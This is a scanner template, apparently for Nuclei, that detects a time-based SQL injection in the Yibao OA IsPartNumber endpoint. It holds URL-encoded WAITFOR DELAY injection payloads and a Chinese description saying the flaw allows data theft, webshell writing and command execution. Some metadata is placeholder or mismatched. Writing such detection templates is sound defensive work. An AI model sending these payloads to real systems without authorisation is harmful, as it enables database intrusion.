id: yibaooa-IsPartNumber-sqli

info:
  name: Template Name
  author: apple
  severity: high
  description: 易宝OA getStockInRequestPrintDetail SQL注入，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。
  reference:
    - http://kpanda.wiki/#/Vulnhub/Y6-5%E6%98%93%E5%AE%9D-OA-SQL?id=y6-5%e6%98%93%e5%ae%9d-oa-sql
  tags: tags

http:
  - method: GET
    path:
      - "{{BaseURL}}/SmartTradeScan/Inventory/IsPartNumber?StockRoomID=1&pn=2%27%3BWAITFOR+DELAY+%270%3A0%3A3%27--"
      - "{{BaseURL}}/SmartTradeScan/Inventory/IsPartNumber?StockRoomID=1&pn=2%27%3BWAITFOR+DELAY+%270%3A0%3A6%27--"
      - "{{BaseURL}}/SmartTradeScan/Inventory/IsPartNumber?StockRoomID=1&pn=2%27%3BWAITFOR+DELAY+%270%3A0%3A9%27--"
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"